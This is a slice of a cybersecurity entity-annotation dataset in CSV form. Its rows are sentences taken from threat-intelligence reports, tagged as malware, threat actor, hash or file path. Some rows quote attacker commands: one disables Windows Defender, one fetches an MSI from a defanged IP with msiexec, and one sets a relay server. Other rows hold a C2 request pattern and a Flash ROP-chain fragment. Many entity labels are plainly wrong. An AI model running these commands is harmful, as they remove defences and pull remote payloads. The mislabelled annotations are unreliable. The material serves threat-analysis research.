,index,text,entities,relations,Comments,id,label,start_offset,end_offset
1110,6484,    This was done using two separate commands: C:\programdate\1.exe -relayserver 87.236.212[.]184:5555  C:\users\public\new.exe -relayserver 87.236.212[.]184:5555,[],[],[],,,,
1111,10413,"For now, we can surmise that it has the makings of a potential targeted attack because of its cyber espionage capabilities, as well as the potential for delivering ransomware and coinminer.","[{'id': 31663, 'label': 'location', 'start_offset': 12, 'end_offset': 15}, {'id': 31664, 'label': 'location', 'start_offset': 175, 'end_offset': 178}, {'id': 31665, 'label': 'malware', 'start_offset': 179, 'end_offset': 188}]",[],[],31663.0,location,12.0,15.0
1112,3706,Discovery,[],[],[],,,,
1113,10943,"In order to do so, these users would be required to enable installation of the applications from “unknown sources” on their devices.",[],[],[],,,,
1114,4111,"The data decryption procedure is as follows:  First, the encrypted data is decrypted with a one-byte XOR key (0xFF).",[],[],[],,,,
1115,1925,"Digging into Urpage, we found another link—two malicious RTF files that exploit different vulnerabilities but download a similar script (detected as TROJ_POWLOAD.GAA) containing two base64-encoded URLs.","[{'id': 47050, 'label': 'threat-actor', 'start_offset': 13, 'end_offset': 19}]",[],[],47050.0,threat-actor,13.0,19.0
1116,2701," Some key takeaways from the claims made in the interview were: LockBit 3.0: Another Upgrade to the World’s Most Active Ransomware Ransomware Groups to Watch: Emerging Threats Average Ransom Payment Up 71% This Year, Approaches $1 Million 2022 Unit 42 Ransomware Threat Report Highlights  Sign up to receive the latest news, cyber threat intelligence and research from us  Please enter your email address!","[{'id': 47939, 'label': 'threat-actor', 'start_offset': 64, 'end_offset': 75}, {'id': 47940, 'label': 'identity', 'start_offset': 244, 'end_offset': 251}]",[],[],47939.0,threat-actor,64.0,75.0
1117,2874,The exploit utilized several advanced exploit techniques to make it almost 100% reliable.,[],[],[],,,,
1118,1386,"All files and directories, including those on mounted USB drives, excluding the floppy drive (A:) are targeted.","[{'id': 46734, 'label': 'FILEPATH', 'start_offset': 94, 'end_offset': 96}]",[],[],46734.0,FILEPATH,94.0,96.0
1119,5164,How are you trying to reduce it?,[],[],[],,,,
1120,9304,Credit card number _cc_expmonth bb Credit card expiration month _cc_expyear cc Credit card expiration year cc_type dd,[],[],[],,,,
1121,2466,"  A majority of the activity used the tomcarwar.jsp filename that was used in the initial PoC script, which accounted for over 57% of the filenames observed.",[],[],[],,,,
1122,13942,"Encrypt the files, drop the ransom note, and wait for the payment.",[],[],[],,,,
1123,2683, StealBit contains the following capabilities:,"[{'id': 47891, 'label': 'malware', 'start_offset': 1, 'end_offset': 9}]",[],[],47891.0,malware,1.0,9.0
1124,4437,"TAG is committed to sharing research to raise awareness on bad actors like Charming Kitten within the security community, and for companies and individuals that may be targeted.","[{'id': 50211, 'label': 'identity', 'start_offset': 0, 'end_offset': 3}, {'id': 50212, 'label': 'threat-actor', 'start_offset': 75, 'end_offset': 90}]",[],[],50211.0,identity,0.0,3.0
1125,3049,Our Wildfire analysis cloud captured the initial app and identified it as Scareware.,"[{'id': 48126, 'label': 'SOFTWARE', 'start_offset': 4, 'end_offset': 12}]",[],[],48126.0,SOFTWARE,4.0,12.0
1126,3171,"BIOPASS RAT possesses basic features found in other malware, such as file system assessment, remote desktop access, file exfiltration, and shell command execution.","[{'id': 48295, 'label': 'malware', 'start_offset': 0, 'end_offset': 11}]",[],[],48295.0,malware,0.0,11.0
1127,8879,"Launching the auxiliary tool via the scheduled task     Scheduled tasks are usually associated with persistence or privilege escalation, which is not the case in this incident.","[{'id': 27462, 'label': 'location', 'start_offset': 24, 'end_offset': 28}, {'id': 27463, 'label': 'attack-pattern', 'start_offset': 37, 'end_offset': 51}, {'id': 27464, 'label': 'location', 'start_offset': 72, 'end_offset': 75}, {'id': 27465, 'label': 'attack-pattern', 'start_offset': 115, 'end_offset': 135}, {'id': 27466, 'label': 'location', 'start_offset': 154, 'end_offset': 158}]",[],[],27462.0,location,24.0,28.0
1128,10566, We have a long-standing policy to send you a warning if we detect that your account is a target of government-backed phishing or malware attempts.,"[{'id': 32231, 'label': 'location', 'start_offset': 11, 'end_offset': 15}, {'id': 32232, 'label': 'location', 'start_offset': 90, 'end_offset': 96}, {'id': 32233, 'label': 'attack-pattern', 'start_offset': 118, 'end_offset': 126}]",[],[],32231.0,location,11.0,15.0
1129,3411,BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  bd8dc7e3909f6663c0fff653d7afbca2b89f2e9bc6f27adaab27f640ccf52975  Silverlight.exe  ,"[{'id': 10291, 'label': 'malware', 'start_offset': 0, 'end_offset': 11}, {'id': 10292, 'label': 'SHA2', 'start_offset': 46, 'end_offset': 110}, {'id': 49092, 'label': 'malware', 'start_offset': 20, 'end_offset': 44}, {'id': 49093, 'label': 'FILEPATH', 'start_offset': 112, 'end_offset': 127}]","[{'id': 685, 'from_id': 10291, 'to_id': 49092, 'type': 'duplicate-of'}, {'id': 686, 'from_id': 49093, 'to_id': 10292, 'type': 'duplicate-of'}, {'id': 687, 'from_id': 49093, 'to_id': 49092, 'type': 'indicates'}, {'id': 688, 'from_id': 10292, 'to_id': 49092, 'type': 'indicates'}]",[],10291.0,malware,0.0,11.0
1130,3905,"Web shells, in their simplicity and straightforwardness, are highly potent when it comes to compromising systems and environments.",[],[],[],,,,
1131,3407,flash_ins.exe  ,"[{'id': 49073, 'label': 'FILEPATH', 'start_offset': 0, 'end_offset': 13}]",[],[],49073.0,FILEPATH,0.0,13.0
1132,13166,"The activities vary in target environments; some execute commands, source target files or folder lists, and copy files from physically isolated hosts to compromised hosts, among other things.","[{'id': 41088, 'label': 'location', 'start_offset': 23, 'end_offset': 29}, {'id': 41089, 'label': 'attack-pattern', 'start_offset': 67, 'end_offset': 73}, {'id': 41090, 'label': 'location', 'start_offset': 74, 'end_offset': 80}, {'id': 41091, 'label': 'location', 'start_offset': 104, 'end_offset': 107}]",[],[],41088.0,location,23.0,29.0
1133,1383,"The following command parameters are passed to AdvancedRun:  ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" /WindowState 0 /CommandLine ""rmdir 'C:\ProgramData\Microsoft\Windows Defender' -Recurse"" /StartDirectory """" /RunAs 8 /Run  ""C:\Users\USERNAME]AppData\Local\Temp\AdvancedRun.exe"" /EXEFilename ""C:\Windows\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run  7.","[{'id': 44990, 'label': 'FILEPATH', 'start_offset': 313, 'end_offset': 339}, {'id': 44987, 'label': 'FILEPATH', 'start_offset': 62, 'end_offset': 119}, {'id': 44988, 'label': 'FILEPATH', 'start_offset': 157, 'end_offset': 198}, {'id': 44989, 'label': 'FILEPATH', 'start_offset': 245, 'end_offset': 297}, {'id': 46724, 'label': 'SOFTWARE', 'start_offset': 47, 'end_offset': 58}]",[],[],44990.0,FILEPATH,313.0,339.0
1134,11105,"The targets would be prompted to install a legitimate version of McAfee anti-virus software from GitHub, while malware was simultaneously silently installed to the system.",[],[],[],,,,
1135,12207,We received leads from Graphika that supported us in this investigation.,[],[],[],,,,
1136,9578,GET http://{C2}/Index.php?vubc={identity} HTTP/1.1,"[{'id': 29372, 'label': 'URL', 'start_offset': 4, 'end_offset': 40}]",[],[],29372.0,URL,4.0,40.0
1137,13686,They will then send a fraudulent wire transfer request to trick recipients into wiring money into the criminals’ accounts.,[],[],[],,,,
1138,4067,HTShell HTShell is a simple backdoor that is developed using the Mongoose framework (version 6.15).,"[{'id': 49901, 'label': 'malware', 'start_offset': 0, 'end_offset': 7}, {'id': 49902, 'label': 'malware', 'start_offset': 8, 'end_offset': 15}, {'id': 49903, 'label': 'tools', 'start_offset': 65, 'end_offset': 98}]",[],[],49901.0,malware,0.0,7.0
1139,2908,_local10 = this.m_ZwProtectAddr;  _local41 = _local6;  s[_local28][((((_local6 - _local12) / 4) - 2) - 4)] = (_local41 & 0xFFFFF000);  s[_local28][((((_local6 - _local12) / 4) - 1) - 4)] = 0x3000;  s[_local28][((_local6 - _local12) / 4)] = _local10;  s[_local28][(((_local6 - _local12) / 4) + 1)] = (_local41 + 28);  The code above shows the Flash code setting up the ROP chain to bypass DEP and includes another interesting marker.,"[{'id': 48084, 'label': 'SOFTWARE', 'start_offset': 342, 'end_offset': 347}]",[],[],48084.0,SOFTWARE,342.0,347.0
1140,7878,The other 94.2% of applications place no restrictions on the backup of their internal storage data.,[],[],[],,,,
1141,6406,"The ""Brute Ratel C4 Tool Command and Control Traffic Detections"" signature is threat ID 86647.",[],[],[],,,,
1142,2323,"Upon analysis, we realized this binary contained code which could escape the Safari sandbox, elevate privileges, and download a second stage from the C2.","[{'id': 47398, 'label': 'SOFTWARE', 'start_offset': 77, 'end_offset': 83}]",[],[],47398.0,SOFTWARE,77.0,83.0
1143,5931,"We assess that these campaigns delivered ALIEN, a simple Android malware in charge of loading PREDATOR, an Android implant described by CitizenLab in December 2021.","[{'id': 18237, 'label': 'malware', 'start_offset': 41, 'end_offset': 46}]",[],[],18237.0,malware,41.0,46.0
1144,650,"Once executed, it overwrites the Master Boot Record and creates a scheduled task to reboot the system.","[{'id': 46233, 'label': 'SOFTWARE', 'start_offset': 33, 'end_offset': 51}, {'id': 46234, 'label': 'attack-pattern', 'start_offset': 66, 'end_offset': 80}]",[],[],46233.0,SOFTWARE,33.0,51.0
1145,10362,"If these samples are indeed related to MuddyWater, this means that the threat actors behind MuddyWater are continuously evolving their tools and techniques to make them more effective and persistent.","[{'id': 31543, 'label': 'location', 'start_offset': 17, 'end_offset': 20}, {'id': 31544, 'label': 'threat-actor', 'start_offset': 39, 'end_offset': 49}, {'id': 31545, 'label': 'location', 'start_offset': 56, 'end_offset': 61}, {'id': 31546, 'label': 'threat-actor', 'start_offset': 92, 'end_offset': 102}, {'id': 31547, 'label': 'location', 'start_offset': 103, 'end_offset': 106}, {'id': 31548, 'label': 'location', 'start_offset': 141, 'end_offset': 144}, {'id': 31549, 'label': 'location', 'start_offset': 164, 'end_offset': 168}, {'id': 31550, 'label': 'location', 'start_offset': 184, 'end_offset': 187}]",[],[],31543.0,location,17.0,20.0
1146,6611,General Mitigations:,[],[],[],,,,
1147,7440,"At this point, the user is faced with a legitimate Google site—since all OAuth approvals are done on the site of the service provider—but the application itself is part of a phishing scheme.","[{'id': 23131, 'label': 'location', 'start_offset': 8, 'end_offset': 13}, {'id': 23133, 'label': 'location', 'start_offset': 89, 'end_offset': 92}, {'id': 23134, 'label': 'attack-pattern', 'start_offset': 174, 'end_offset': 182}]",[],[],23131.0,location,8.0,13.0
1148,13801,   Figure 8.,[],[],[],,,,
1149,13764,Table: The sizes of functions Table:,[],[],[],,,,
1150,4907,"We have observed that actors use various types of malware based on personal preference, most of which are easily available on Github.","[{'id': 50922, 'label': 'SOFTWARE', 'start_offset': 126, 'end_offset': 132}]",[],[],50922.0,SOFTWARE,126.0,132.0
1151,4944,Attackers used the Munich Security and the Think-20 (T20) Italy conferences as lures in non-malicious first contact email messages to get users to respond.,[],[],[],,,,
1152,2072,"In one of the videos, we actually observed the threat actor performing a DNS leak test on his Android phone.",[],[],[],,,,
1153,3906,"These malicious code pieces can be written in ASP, PHP, and JSP, or any script that can execute a system command with a parameter that can pass through the web.",[],[],[],,,,
1154,12012,"Cookie Theft, also known as “pass-the-cookie attack,” is a session hijacking technique that enables access to user accounts with session cookies stored in the browser.","[{'id': 37163, 'label': 'attack-pattern', 'start_offset': 59, 'end_offset': 76}]",[],[],37163.0,attack-pattern,59.0,76.0
1155,11473,"While we continue to fight these threats on a technical level, the providers of these capabilities operate openly in democratic countries.",[],[],[],,,,
1156,4812,"In this case, the Android app name was stopwar.apk (com.ddos.stopwar) and was distributed from the website stopwar.pro.","[{'id': 50733, 'label': 'malware', 'start_offset': 39, 'end_offset': 50}, {'id': 50732, 'label': 'SOFTWARE', 'start_offset': 18, 'end_offset': 29}, {'id': 50734, 'label': 'malware', 'start_offset': 52, 'end_offset': 68}, {'id': 50735, 'label': 'DOMAIN', 'start_offset': 107, 'end_offset': 118}]","[{'id': 999, 'from_id': 50735, 'to_id': 50734, 'type': 'hosts'}, {'id': 1000, 'from_id': 50735, 'to_id': 50733, 'type': 'hosts'}]",[],50733.0,malware,39.0,50.0
1157,9316,"In addition, the skimmer Mirrorthief used in the attack is very different from the others since it’s specially designed to skim PrismWeb’s payment form.",[],[],[],,,,
1158,3440,  Unit 42 recommends customers upgrade to the latest release of F5 BIG-IP products.,"[{'id': 10409, 'label': 'identity', 'start_offset': 2, 'end_offset': 9}, {'id': 49205, 'label': 'tools', 'start_offset': 64, 'end_offset': 73}]",[],[],10409.0,identity,2.0,9.0
1159,4137, Tool name Purpose Description SharpHound AD Discovery Discovery tool to understand the relationship in an AD environment FRPC Intranet Penetration Fast reverse proxy to help expose a local server behind a NAT or firewall to the internet Chisel Intranet Penetration Fast TCP/UDP tunnel RClone Exfiltration A command-line program to sync files and directories to and from different cloud storage providers  Credential Dumping,"[{'id': 49930, 'label': 'attack-pattern', 'start_offset': 406, 'end_offset': 424}, {'id': 49931, 'label': 'tools', 'start_offset': 31, 'end_offset': 41}, {'id': 49932, 'label': 'malware', 'start_offset': 238, 'end_offset': 244}, {'id': 49933, 'label': 'tools', 'start_offset': 286, 'end_offset': 292}]",[],[],49930.0,attack-pattern,406.0,424.0
1160,13500,"This option is particularly interesting since it would be extremely difficult under normal circumstances to gather the contents of a mailbox without any user interaction, which points to possibilities such as insider assistance or even the compromise of the email provider’s systems.",[],[],[],,,,
1161,123,"      Tags  Cloud | Cyber Crime | Expert Perspective | Cyber Threats | APT & Targeted Attacks | Network | Articles, News, Reports",[],[],[],,,,
1162,2694,LockBit’s continuation with operations and its next iteration coming up on the horizon means that organizations and their security teams need to stay vigilant in the ever-evolving threat landscape.,"[{'id': 47927, 'label': 'threat-actor', 'start_offset': 0, 'end_offset': 7}]",[],[],47927.0,threat-actor,0.0,7.0
1163,1458,The Y-axis is the number of certificates.,[],[],[],,,,
1164,1092,"Lets say you want to update an Internet Explorer (IE) cookie file, adding a unique identifier for use later.","[{'id': 44932, 'label': 'SOFTWARE', 'start_offset': 31, 'end_offset': 53}]",[],[],44932.0,SOFTWARE,31.0,53.0
1165,11879,"After a fingerprinting phase, similar to the one used with the Chrome exploit above, users were served an Internet Explorer 0-day.","[{'id': 36616, 'label': 'attack-pattern', 'start_offset': 8, 'end_offset': 22}, {'id': 36617, 'label': 'location', 'start_offset': 45, 'end_offset': 48}]",[],[],36616.0,attack-pattern,8.0,22.0
1166,10019,— TROJ_SIDELOADR.ENC bcfacc1ad5686aee3a9d8940e46d32af62f8e1cd1631653795778736b67b6d6e,"[{'id': 30593, 'label': 'SHA2', 'start_offset': 21, 'end_offset': 85}]",[],[],30593.0,SHA2,21.0,85.0
1167,5433,"If it is suspected that an organization’s devices have been infected with Cyclops Blink, it is best to get a new router.","[{'id': 51434, 'label': 'malware', 'start_offset': 74, 'end_offset': 87}]",[],[],51434.0,malware,74.0,87.0
1168,5664,The Glupteba malware family is primarily distributed through pay per install (PPI) networks and via traffic purchased from traffic distribution systems (TDS).,"[{'id': 17449, 'label': 'malware', 'start_offset': 4, 'end_offset': 12}, {'id': 17450, 'label': 'location', 'start_offset': 92, 'end_offset': 95}]",[],[],17449.0,malware,4.0,12.0
1169,13906,"The DarkSide ransomware shares many similarities with REvil in this step of the process, including the structure of ransom notes and the use of PowerShell to execute a command that deletes shadow copies from the network.","[{'id': 48722, 'label': 'malware', 'start_offset': 4, 'end_offset': 13}, {'id': 48723, 'label': 'malware', 'start_offset': 54, 'end_offset': 59}, {'id': 48724, 'label': 'tools', 'start_offset': 144, 'end_offset': 155}]",[],[],48722.0,malware,4.0,13.0
1170,10965,"Our products are designed with robust built-in security features, like Gmail protections against phishing and Safe Browsing in Chrome, but we still dedicate significant resources to developing new tools and technology to help identify, track and stop this kind of activity.","[{'id': 33361, 'label': 'location', 'start_offset': 13, 'end_offset': 16}, {'id': 33362, 'label': 'location', 'start_offset': 47, 'end_offset': 55}, {'id': 33364, 'label': 'attack-pattern', 'start_offset': 97, 'end_offset': 105}, {'id': 33365, 'label': 'location', 'start_offset': 106, 'end_offset': 109}, {'id': 33366, 'label': 'threat-actor', 'start_offset': 110, 'end_offset': 114}, {'id': 33367, 'label': 'location', 'start_offset': 203, 'end_offset': 206}, {'id': 33368, 'label': 'location', 'start_offset': 242, 'end_offset': 245}, {'id': 33369, 'label': 'malware', 'start_offset': 246, 'end_offset': 250}]",[],[],33361.0,location,13.0,16.0
1171,11306,"In December 2021, TAG discovered a novel Charming Kitten tool, named HYPERSCRAPE, used to steal user data from Gmail, Yahoo!, and Microsoft Outlook accounts.","[{'id': 34552, 'label': 'threat-actor', 'start_offset': 41, 'end_offset': 56}, {'id': 34553, 'label': 'location', 'start_offset': 57, 'end_offset': 61}, {'id': 34557, 'label': 'location', 'start_offset': 126, 'end_offset': 129}]",[],[],34552.0,threat-actor,41.0,56.0
1172,4171,"After checking the backdoor SmileSvr, we found that there was a code similarity between it and Troj_YAHAMAM, which was used by Earth Centaur in an earlier operation.","[{'id': 49973, 'label': 'malware', 'start_offset': 95, 'end_offset': 107}, {'id': 49974, 'label': 'threat-actor', 'start_offset': 127, 'end_offset': 140}]","[{'id': 897, 'from_id': 49974, 'to_id': 49973, 'type': 'uses'}]",[],49973.0,malware,95.0,107.0
1173,9931,IP addresses associated with a few private VPN exit nodes connected to APT33,"[{'id': 30317, 'label': 'threat-actor', 'start_offset': 71, 'end_offset': 76}]",[],[],30317.0,threat-actor,71.0,76.0
1174,223," From January to late February, it appears that the number of Ukraine-related phishing and scam sites largely followed a similar trend as Ukraine-related internet searches; however, the number of phishing and scam sites has continued to rise through mid-late March as the situation remains ongoing.","[{'id': 737, 'label': 'attack-pattern', 'start_offset': 78, 'end_offset': 86}, {'id': 741, 'label': 'attack-pattern', 'start_offset': 196, 'end_offset': 204}, {'id': 45920, 'label': 'TIME', 'start_offset': 6, 'end_offset': 13}, {'id': 45925, 'label': 'attack-pattern', 'start_offset': 209, 'end_offset': 219}, {'id': 45921, 'label': 'TIME', 'start_offset': 17, 'end_offset': 30}, {'id': 45922, 'label': 'location', 'start_offset': 62, 'end_offset': 69}, {'id': 45923, 'label': 'location', 'start_offset': 138, 'end_offset': 145}]",[],[],737.0,attack-pattern,78.0,86.0
1175,250,We strongly recommend that users be alert to the possibility of cybersquatting domains.,"[{'id': 45946, 'label': 'attack-pattern', 'start_offset': 64, 'end_offset': 78}]",[],[],45946.0,attack-pattern,64.0,78.0
1176,4144,The usage is as follows:          Intranet Penetration,[],[],[],,,,
1177,2070, The videos found gave us insight into x4k operations before moving into ransomware activity specifically.,"[{'id': 45249, 'label': 'threat-actor', 'start_offset': 39, 'end_offset': 43}]",[],[],45249.0,threat-actor,39.0,43.0
1178,7272,     Figure 3.,[],[],[],,,,
1179,5312,       Figure 1.,[],[],[],,,,
1180,778,Figure 10: object is in the free list now  ,[],[],[],,,,
1181,14206,Tools that exploited vulnerabilities in Internet of Things (IoT) devices were also made available on GitHub.,[],[],[],,,,
1182,781,"When page heap is turned on, the system allows only one object in one memory page.",[],[],[],,,,
1183,13427,We look forward to continuing our work in this space and advancing the safety and security of our users around the world.,"[{'id': 41787, 'label': 'location', 'start_offset': 53, 'end_offset': 56}, {'id': 41788, 'label': 'tools', 'start_offset': 71, 'end_offset': 77}, {'id': 41789, 'label': 'location', 'start_offset': 78, 'end_offset': 81}, {'id': 41790, 'label': 'location', 'start_offset': 82, 'end_offset': 90}, {'id': 41791, 'label': 'location', 'start_offset': 115, 'end_offset': 120}]",[],[],41787.0,location,53.0,56.0
1184,4350,Spear-phishing email from early August,"[{'id': 50133, 'label': 'attack-pattern', 'start_offset': 0, 'end_offset': 14}, {'id': 50134, 'label': 'TIME', 'start_offset': 26, 'end_offset': 38}]",[],[],50133.0,attack-pattern,0.0,14.0
1185,1159,"However, the research necessary to conclusively prove this hypothesis would be very time consuming and provide little other benefit.",[],[],[],,,,
1186,136," Sign up to receive the latest news, cyber threat intelligence and research from us  Please enter your email address!  Please mark, I'm not a robot!  ",[],[],[],,,,
1187,9499,Requesting a URL therefore results in executing the corresponding code on an infected system.,[],[],[],,,,
1188,2468,The pie chart in Figure 13 shows a high-level breakdown of the most common filenames.,[],[],[],,,,
1189,5014,Financially motivated and criminal actors are also using current events as a means for targeting users.,[],[],[],,,,
1190,6548,"The group, which was primarily motivated by profit, is noted for utilizing self-developed technically-proficient tools for their attacks.",[],[],[],,,,
1191,12721,Implement private keys authentication for Secure Shell (SSH) on the client side for stronger access control security.,"[{'id': 39504, 'label': 'attack-pattern', 'start_offset': 10, 'end_offset': 22}, {'id': 39505, 'label': 'location', 'start_offset': 49, 'end_offset': 54}, {'id': 39506, 'label': 'location', 'start_offset': 108, 'end_offset': 116}]",[],[],39504.0,attack-pattern,10.0,22.0
1192,13197,"Like other versions, it uses the DNS protocol to communicate with the backdoor controller.",[],[],[],,,,
1193,13867,Even the DarkSide actors themselves admit that they just buy access to company networks — they have no idea how access was acquired.,"[{'id': 43011, 'label': 'malware', 'start_offset': 9, 'end_offset': 17}, {'id': 43012, 'label': 'identity', 'start_offset': 52, 'end_offset': 56}, {'id': 43013, 'label': 'location', 'start_offset': 57, 'end_offset': 60}]",[],[],43011.0,malware,9.0,17.0
1194,1148, The first is very likely due to the similarities present in the order of keys hit.,[],[],[],,,,
1195,14199,"Increase attack surface enumeration across IoT, Industrial IoT, mobile and cloud; Expand or deploy a zero trust architecture framework and;  Fortify your backups",[],[],[],,,,
1196,13706,Trend Micro protects both small- to medium-sized businesses and enterprises against phishing- and BEC-related emails.,"[{'id': 51757, 'label': 'attack-pattern', 'start_offset': 98, 'end_offset': 101}, {'id': 48799, 'label': 'attack-pattern', 'start_offset': 84, 'end_offset': 92}]",[],[],51757.0,attack-pattern,98.0,101.0
1197,692,"Leveraging this logical vulnerability, known as CVE-2018-8174, allows attackers to execute arbitrary HTML/JavaScript/VBScript.","[{'id': 46270, 'label': 'vulnerability', 'start_offset': 48, 'end_offset': 61}, {'id': 46271, 'label': 'attack-pattern', 'start_offset': 83, 'end_offset': 125}]",[],[],46270.0,vulnerability,48.0,61.0
1198,11809,We warn users when we suspect a government-backed threat like APT35 is targeting them.,"[{'id': 36425, 'label': 'threat-actor', 'start_offset': 62, 'end_offset': 67}, {'id': 36426, 'label': 'location', 'start_offset': 81, 'end_offset': 85}]",[],[],36425.0,threat-actor,62.0,67.0
1199,9886,"For example, for at least two years the group used the private website of a high-ranking European politician (a member of her country’s defense committee) to send spear phishing emails to companies that are part of the supply chain of oil products.","[{'id': 30148, 'label': 'attack-pattern', 'start_offset': 163, 'end_offset': 177}, {'id': 30149, 'label': 'location', 'start_offset': 203, 'end_offset': 206}, {'id': 30150, 'label': 'location', 'start_offset': 219, 'end_offset': 225}, {'id': 30151, 'label': 'location', 'start_offset': 235, 'end_offset': 238}]",[],[],30148.0,attack-pattern,163.0,177.0
1200,1994,"Due to the surge of this malicious activity, we’ve created this threat assessment for overall awareness.",[],[],[],,,,
1201,7685,Emails with an attached .ISO image is an .LNK file that uses command line msiexec to execute an MSI file from a URL such as hxxp://139[.]180[.]195[.]36/pm2.,[],[],[],,,,
1202,709,"Instead, here are eight things I am doing right now to protect Palo Alto Networks and my home (and mother-in-law) and that you should be doing, too:","[{'id': 46277, 'label': 'identity', 'start_offset': 63, 'end_offset': 81}]",[],[],46277.0,identity,63.0,81.0
1203,14094,"When doing attribution, finding code sharing between different samples is one of the most desired discoveries.",[],[],[],,,,
1204,5503,"One of its file stealers, swissknife2, abuses a cloud storage service as a repository of exfiltrated files.","[{'id': 51516, 'label': 'malware', 'start_offset': 16, 'end_offset': 24}, {'id': 51517, 'label': 'malware', 'start_offset': 26, 'end_offset': 37}]",[],[],51516.0,malware,16.0,24.0
1205,1788,"In addition, the ransomware is also capable of scanning multiple endpoints for the Log4j vulnerability Log4shell using Nmap NSE script.","[{'id': 45130, 'label': 'vulnerability', 'start_offset': 103, 'end_offset': 112}, {'id': 45129, 'label': 'tools', 'start_offset': 119, 'end_offset': 127}, {'id': 45131, 'label': 'vulnerability', 'start_offset': 83, 'end_offset': 88}]",[],[],45130.0,vulnerability,103.0,112.0
1206,3035,"For every kind of device or system, you should think about and understand how you can do updates for:  a.",[],[],[],,,,
1207,3915,"Through the ASPX file, malicious actors can establish a foothold in affected public-facing Outlook Web App (OWA) servers and send remote commands through them.","[{'id': 49770, 'label': 'SOFTWARE', 'start_offset': 91, 'end_offset': 112}]",[],[],49770.0,SOFTWARE,91.0,112.0
1208,7454,           Figure 6.,[],[],[],,,,
1209,3968,Do not use the same password for multiple applications or websites.,[],[],[],,,,
1210,13579,     Figure 5.,[],[],[],,,,
1211,1099,"It can then read, tweak, and write the file without fear of any clobbering by other processes.",[],[],[],,,,
1212,2637,"And the LockBit 2.0 RaaS leak site has the most significant number of published victims, with over 850 in total.","[{'id': 45639, 'label': 'threat-actor', 'start_offset': 8, 'end_offset': 19}]",[],[],45639.0,threat-actor,8.0,19.0
1213,3047,We have recently been investigating an antivirus app in the Google Play store that was displaying fake virus detection results to scare users into purchasing a premium service.,"[{'id': 48125, 'label': 'SOFTWARE', 'start_offset': 60, 'end_offset': 71}]",[],[],48125.0,SOFTWARE,60.0,71.0
1214,6202,"We have reported the vulnerability to the company that developed the webmail system, which informed us that the vulnerability had been fixed since January 2020.",[],[],[],,,,
1215,964,SMS body and sender number read  ,[],[],[],,,,
1216,13682,The landing page index.html has a dummy speech functio      Figure 8.,[],[],[],,,,
1217,2636,"As of May 25, LockBit 2.0 accounted for 46% of all ransomware-related breach events for 2022.","[{'id': 47817, 'label': 'TIME', 'start_offset': 6, 'end_offset': 12}, {'id': 47818, 'label': 'malware', 'start_offset': 14, 'end_offset': 25}, {'id': 47819, 'label': 'TIME', 'start_offset': 88, 'end_offset': 92}]",[],[],47817.0,TIME,6.0,12.0
1218,13950,Phase 1 (+ possibly Phase 2 or Phase 3) + directly emailing the victim’s customer base or having contracted call centers contact customers.,[],[],[],,,,
1219,2453,"Of these, only the two commands involving /etc/passwd would possibly suggest malicious intent for exploitation – the rest of the commands suggest general scanning activity.","[{'id': 47521, 'label': 'FILEPATH', 'start_offset': 42, 'end_offset': 53}]",[],[],47521.0,FILEPATH,42.0,53.0
1220,8796,"As part of our wider tracking of APT31 activity, we've also seen them deploy targeted malware campaigns.","[{'id': 27231, 'label': 'location', 'start_offset': 65, 'end_offset': 69}, {'id': 27232, 'label': 'attack-pattern', 'start_offset': 77, 'end_offset': 93}]",[],[],27231.0,location,65.0,69.0
1221,7050,The result is a file with the following structure:     Size of the 32-bit shellcode  32-bit shellcode  Size of the 64-bit shellcode  64-bit shellcode   Table 2.,"[{'id': 22098, 'label': 'location', 'start_offset': 40, 'end_offset': 49}, {'id': 22099, 'label': 'identity', 'start_offset': 70, 'end_offset': 73}, {'id': 22100, 'label': 'identity', 'start_offset': 88, 'end_offset': 91}, {'id': 22101, 'label': 'identity', 'start_offset': 118, 'end_offset': 121}, {'id': 22102, 'label': 'identity', 'start_offset': 136, 'end_offset': 139}]",[],[],22098.0,location,40.0,49.0
1222,8579,The attackers embed javascript into phishing pages that notify them when the page has been loaded.,"[{'id': 26517, 'label': 'attack-pattern', 'start_offset': 36, 'end_offset': 44}, {'id': 26518, 'label': 'location', 'start_offset': 63, 'end_offset': 67}, {'id': 26519, 'label': 'location', 'start_offset': 77, 'end_offset': 81}]",[],[],26517.0,attack-pattern,36.0,44.0
1223,157,"In the early days of Window Vista, Microsoft enabled aggressive security checking to ensure user-initiated actions were legitimate.","[{'id': 45849, 'label': 'SOFTWARE', 'start_offset': 21, 'end_offset': 33}, {'id': 45850, 'label': 'identity', 'start_offset': 35, 'end_offset': 44}]",[],[],45849.0,SOFTWARE,21.0,33.0
